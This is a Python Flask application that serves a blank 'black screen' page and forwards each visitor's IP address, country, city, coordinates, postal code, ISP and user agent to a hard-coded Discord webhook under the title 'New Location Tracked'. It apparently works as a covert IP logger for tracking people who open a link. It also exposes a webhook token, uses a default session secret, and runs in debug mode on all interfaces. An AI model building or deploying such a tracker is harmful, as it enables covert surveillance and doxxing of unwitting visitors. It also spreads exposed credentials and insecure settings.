import os
import logging
import requests
import json
from flask import Flask, render_template, request, jsonify
from datetime import datetime

# Configure logging for debugging
logging.basicConfig(level=logging.DEBUG)

# Create the Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "default_secret_key_for_development")

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1406132270611566674/ZqzNHpdelTqk6Mukl9UGiMtGzmSrOrX22jnLnlXtjnbAv3_Yf2v8-BIdOM9-x072nunt"

def send_to_discord(location_data):
    """Send location data to Discord webhook"""
    try:
        # Get visitor's IP and user agent
        visitor_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Create Discord embed
        embed = {
            "title": "🎯 New Location Tracked",
            "color": 16753920,  # Orange color
            "timestamp": datetime.utcnow().isoformat(),
            "fields": [
                {"name": "🌐 IP Address", "value": f"`{location_data.get('ip', 'N/A')}`", "inline": True},
                {"name": "🏳️ Country", "value": location_data.get('country_name', 'N/A'), "inline": True},
                {"name": "🗺️ Region", "value": location_data.get('region', 'N/A'), "inline": True},
                {"name": "🏙️ City", "value": location_data.get('city', 'N/A'), "inline": True},
                {"name": "📍 Coordinates", "value": f"{location_data.get('latitude', 'N/A')}, {location_data.get('longitude', 'N/A')}", "inline": True},
                {"name": "📮 Postal Code", "value": location_data.get('postal', 'N/A'), "inline": True},
                {"name": "🕐 Timezone", "value": location_data.get('timezone', 'N/A'), "inline": True},
                {"name": "🌐 ISP", "value": location_data.get('org', 'N/A'), "inline": True},
                {"name": "💻 User Agent", "value": f"```{user_agent[:100]}...```" if len(user_agent) > 100 else f"```{user_agent}```", "inline": False}
            ],
            "footer": {
                "text": "Location Tracker • Powered by ipapi.co"
            }
        }
        
        payload = {
            "embeds": [embed]
        }
        
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        if response.status_code == 204:
            logging.info("Successfully sent location data to Discord")
            return True
        else:
            logging.error(f"Failed to send to Discord: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        logging.error(f"Error sending to Discord: {str(e)}")
        return False

@app.route('/')
def index():
    """Serve the black screen page"""
    return render_template('index.html')

@app.route('/track', methods=['POST'])
def track_location():
    """Receive location data and send to Discord"""
    try:
        location_data = request.get_json()
        if location_data:
            success = send_to_discord(location_data)
            return jsonify({"success": success})
        return jsonify({"success": False, "error": "No data received"})
    except Exception as e:
        logging.error(f"Error in track_location: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return render_template('index.html'), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    return render_template('index.html'), 500

if __name__ == '__main__':
    # Run the app on port 5000, binding to all interfaces
    app.run(host='0.0.0.0', port=5000, debug=True)
